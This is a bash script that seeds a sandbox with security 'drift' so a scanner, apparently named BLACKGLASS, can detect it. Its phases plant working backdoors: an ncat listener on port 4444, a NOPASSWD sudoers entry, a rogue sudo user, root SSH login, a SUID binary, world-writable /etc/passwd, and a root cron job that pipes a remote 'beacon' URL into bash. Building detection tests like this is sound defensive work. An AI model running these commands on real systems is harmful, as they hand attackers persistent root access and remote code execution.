#!/bin/bash
# =============================================================
#  BLACKGLASS — Sandbox automated drift seeder
#  Non-interactive: applies one drift "scene" per invocation.
#  Called by the sandbox worker over SSH.
#
#  Usage:  bash /root/sandbox/seed.sh <phase>
#    phase 0 = clean baseline (no changes, just verifies setup)
#    phase 1 = backdoor port listener
#    phase 2 = sudoers escalation
#    phase 3 = rogue user account
#    phase 4 = sudo group membership
#    phase 5 = sshd PermitRootLogin yes
#    phase 6 = cron backdoor
#    phase 7 = suid binary
#    phase 8 = world-writable /etc/passwd
#
#  Phases are cumulative — each run builds on the previous.
#  Calling phase N twice is safe (idempotent).
# =============================================================

set -euo pipefail

PHASE="${1:-0}"

log() { echo "[sandbox-seed] phase=${PHASE} $*"; }

case "$PHASE" in
  0)
    log "Clean baseline — verifying setup"
    # Ensure the blackglass scan user exists and nothing extra is present
    id blackglass &>/dev/null || useradd -r -s /usr/sbin/nologin blackglass
    # Clean up any previous drift so baseline is clean
    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
    rm -f /etc/sudoers.d/sandbox-backdoor 2>/dev/null || true
    userdel -r attacker-ssh 2>/dev/null || true
    sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null || true
    rm -f /etc/cron.d/sandbox-beacon 2>/dev/null || true
    find /usr/local/bin -name 'sandbox-*' -delete 2>/dev/null || true
    chmod 644 /etc/passwd 2>/dev/null || true
    log "Clean baseline applied"
    ;;

  1)
    log "Scene 1 — backdoor port listener on TCP 4444"
    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
    nohup ncat -lkp 4444 </dev/null >/dev/null 2>&1 &
    log "Port 4444 now listening (PID $!)"
    ;;

  2)
    log "Scene 2 — sudoers privilege escalation"
    echo 'sandbox-user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/sandbox-backdoor
    chmod 440 /etc/sudoers.d/sandbox-backdoor
    log "/etc/sudoers.d/sandbox-backdoor created"
    ;;

  3)
    log "Scene 3 — rogue user account"
    useradd -m -s /bin/bash attacker-ssh 2>/dev/null || true
    log "User 'attacker-ssh' added"
    ;;

  4)
    log "Scene 4 — sudo group membership for rogue user"
    usermod -aG sudo attacker-ssh 2>/dev/null || true
    log "attacker-ssh added to sudo group"
    ;;

  5)
    log "Scene 5 — sshd PermitRootLogin yes"
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    log "sshd_config: PermitRootLogin set to yes"
    ;;

  6)
    log "Scene 6 — cron backdoor"
    echo '*/5 * * * * root curl -s http://203.0.113.0/beacon | bash' > /etc/cron.d/sandbox-beacon
    chmod 644 /etc/cron.d/sandbox-beacon
    log "/etc/cron.d/sandbox-beacon created"
    ;;

  7)
    log "Scene 7 — SUID binary"
    cp /usr/bin/id /usr/local/bin/sandbox-id
    chmod u+s /usr/local/bin/sandbox-id
    log "SUID binary /usr/local/bin/sandbox-id created"
    ;;

  8)
    log "Scene 8 — world-writable /etc/passwd"
    chmod 666 /etc/passwd
    log "/etc/passwd set to world-writable"
    ;;

  *)
    log "Unknown phase '$PHASE' — nothing done"
    exit 1
    ;;
esac

log "Done"
